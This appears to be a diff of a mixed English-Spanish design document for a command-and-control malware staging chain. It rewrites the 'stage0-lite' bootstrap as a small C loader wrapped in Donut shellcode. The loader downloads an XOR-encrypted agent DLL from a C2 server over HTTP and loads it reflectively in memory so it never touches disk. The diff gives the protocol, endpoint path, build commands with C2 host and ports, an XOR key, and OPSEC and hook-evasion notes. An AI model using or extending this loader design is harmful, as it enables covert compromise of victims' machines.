@@ -40,13 +40,13 @@ The staging system consists of three distinct stages, each with a specific respo
                        │ Executes
                        ▼
         ┌──────────────────────────────────────┐
-        │  Stage 3: Stage0 (Bootstrap)         │
+        │  Stage 3: Stage0-lite (Bootstrap)    │
         │                                      │
-        │  - Position-independent code         │
-        │  - Initial C2 beacon                 │
-        │  - TLS session establishment         │
-        │  - Full agent download               │
-        │  - Agent execution in memory         │
+        │  - Plain C, ~16 KB EXE / ~64 KB SC  │
+        │  - WinHTTP download (HTTP port 5555) │
+        │  - XOR decrypt en buffer en memoria  │
+        │  - Reflective PE loader (no disco)   │
+        │  - CreateThread → DllMain del agente │
         └──────────────┬───────────────────────┘
                        │ Downloads & Executes
                        ▼
@@ -148,59 +148,83 @@ The staging system consists of three distinct stages, each with a specific respo
 - ✅ No network activity
 - ✅ Indirect syscalls via dinvk (bypasses userland hooks)
 
-### Stage 3: Stage0 (Bootstrap Payload)
+### Stage 3: Stage0-lite (Bootstrap Payload — C implementation)
 
-**Location**: `stages/stage0/`
+**Location**: `stages/stage0-lite/`
 
-**Purpose**: Minimal bootstrap that contacts C2 and downloads the full agent.
+**Purpose**: Minimal C-based bootstrap (~16 KB EXE / ~64 KB Donut shellcode) que descarga y carga reflectivamente el agent DLL completamente en memoria.
 
 **Key Characteristics**:
-- ✅ Position-independent code (no fixed addresses)
-- ✅ Minimal network signature (single beacon + download)
-- ✅ TLS encrypted communication
-- ✅ Downloads full agent on demand via HTTP API
-- ✅ Executes agent as separate process
+- ✅ Escrito en C puro (no Rust runtime, no std), compilado con `mingw-w64 -Os -nostartfiles`
+- ✅ Wrapeado con Donut → shellcode PIC ejecutable desde cualquier región de memoria
+- ✅ Descarga `agent.dll` vía **WinHTTP** (HTTP port 5555, sin TLS para el download)
+- ✅ XOR decrypt in-place en buffer de memoria (nunca toca disco)
+- ✅ **Reflective PE loader** propio: mapeo de secciones, base relocations, IAT resolution, `CreateThread` para DllMain
+- ✅ Agent.dll corre en su propio thread; stage0-lite se limpia y retorna
+- ❌ Network activity (inevitable para descargar el agente)
+
+**Archivos fuente**:
+```
+stages/stage0-lite/src/
+├── config.h          # C2_HOST, C2_PORT, API_PORT, STAGE1_XOR_KEY, STAGE1_XOR_KEY_LEN
+├── stage0_lite.c     # Entry point: orquesta download + reflective_load
+├── winhttp_dl.c      # WinHTTP download: prefijo 4-byte LE + XOR decrypt  
+└── pe_loader.c       # Reflective loader: secciones, relocaciones, IAT, DllMain thread
+```
 
 **C2 Protocol**:
-1. Initial beacon: `STAGE0_BEACON|hostname|username|os` (TCP)
-2. TLS session establishment for verification
-3. HTTP GET `/api/stage0/agent` (port 5555)
-4. Response format: `key_len(4) + key + size(4) + XOR_encrypted_agent`
-5. XOR decrypt agent bytes
-6. Write to `%TEMP%\svchost_XXXXX.exe`
-7. Spawn agent as detached process
-
-**Why Stage0 exists**:
-- Keeps earlier stages generic and C2-independent
-- Only Stage0 needs C2 address configuration
-- Full agent downloaded only after successful bootstrap
-- Can be updated independently from ESTER/JAVELIN
+1. HTTP GET `http://<C2_HOST>:<API_PORT>/api/stage1/agent_dll`
+2. Response: `size(4 bytes LE)` + `XOR(agent.dll, STAGE1_XOR_KEY)`
+3. XOR decrypt in buffer → MZ/PE válido
+4. `VirtualAlloc` + mapeo de secciones + relocations + IAT
+5. `CreateThread` apuntando a `DllMain(DLL_PROCESS_ATTACH)`
+6. `LocalFree` del buffer staging
 
 **Execution Flow**:
-1. Send initial beacon to C2
-2. Establish TLS session (verification)
-3. HTTP GET to download XOR-encrypted agent
-4. Decrypt agent bytes
-5. Write agent to temp directory
-6. Spawn agent as detached process
-7. Exit (agent continues running)
+1. `winhttp_download()` → HTTP GET, lee prefijo de tamaño, XOR-decripta body
+2. Validar `MZ` magic y cabeceras NT
+3. `VirtualAlloc` del tamaño `SizeOfImage`
+4. Copiar headers + secciones
+5. Aplicar base relocations (`delta = alloc_base - ImageBase`)
+6. Resolver IAT con `LoadLibraryA` / `GetProcAddress`
+7. Aplicar protecciones por sección (`VirtualProtect`)
+8. `CreateThread` → `DllMain(base, DLL_PROCESS_ATTACH, NULL)`
+9. `WaitForSingleObject` 3s → `CloseHandle`; stage0 retorna 0
 
 **OPSEC Trade-offs**:
-- ✅ Position-independent (can run from any memory location)
-- ✅ TLS encrypted beacon
-- ✅ XOR encrypted agent download
-- ✅ Agent runs as separate process (survives Stage0 exit)
-- ❌ Agent written to disk (required for complex Rust binaries)
-- ❌ Network activity (unavoidable for agent download)
+- ✅ Agent DLL **nunca toca disco** (100% en memoria)
+- ✅ Shellcode PIC (Donut) — no necesita loader externo
+- ✅ Binario diminuto (~64 KB)
+- ✅ XOR encrypt del wire — no MZ header en tráfico
+- ⚠️ WinHTTP en HTTP plano para el download (TLS en puerto 4444 para el beacon del agente)
+- ❌ Network activity (inevitable)
+
+**Build**:
+```bash
+# En Kali (requiere mingw-w64 + wine donut.exe)
+cd stages/stage0-lite
+bash build.sh --ip <C2_HOST> --port 4444 --api-port 5555
+
+# Salida:
+# dist/stage0_lite.exe     (~16 KB — para testing directo)
+# dist/stage0_lite.bin     (raw shellcode Donut)
+# dist/stage0_lite.bin.enc (XOR-encrypted para JAVELIN)
+```
+
+**Bug crítico resuelto** (2026-03-05):
+- `STAGE1_XOR_KEY_LEN` estaba hardcodeado en 32; la clave `"C2R2_STAGE1_AGENT_KEY_2026_L1TE"` tiene **31 caracteres**
+- El servidor Rust usa `.len()` = 31 correctamente
+- C iteraba sobre 32 bytes (incluyendo el null terminator) → byte 31 del ciclo era `\0` → `e_lfanew` (offset 0x3C) se corrompía
+- Fix: `#define STAGE1_XOR_KEY_LEN 31`
 
 ## Separation of Responsibilities
 
 | Stage | C2 Communication | Payload Execution | Environment Checks | Disk Activity |
 |-------|------------------|-------------------|-------------------|---------------|
 | ESTER | ❌ None          | ❌ No (triggers only) | ✅ Yes          | ✅ Yes (entry point) |
-| JAVELIN | ❌ None        | ✅ Yes (Stage0)   | ❌ No             | ❌ No (memory only) |
-| Stage0 | ✅ Yes          | ✅ Yes (full agent) | ❌ No           | ❌ No (memory only) |
-| Full Agent | ✅ Yes      | ✅ Yes (commands)  | ✅ Yes (advanced) | ⚠️ Optional (modules) |
+| JAVELIN | ❌ None        | ✅ Yes (stage0-lite shellcode) | ❌ No  | ❌ No (memory only) |
+| Stage0-lite | ✅ HTTP download | ✅ Yes (reflective agent load) | ❌ No | ❌ No (memory only) |
+| Full Agent | ✅ TLS beacon   | ✅ Yes (commands)  | ✅ Yes (advanced) | ⚠️ Optional (modules) |
 
 ## Building the Stages
 
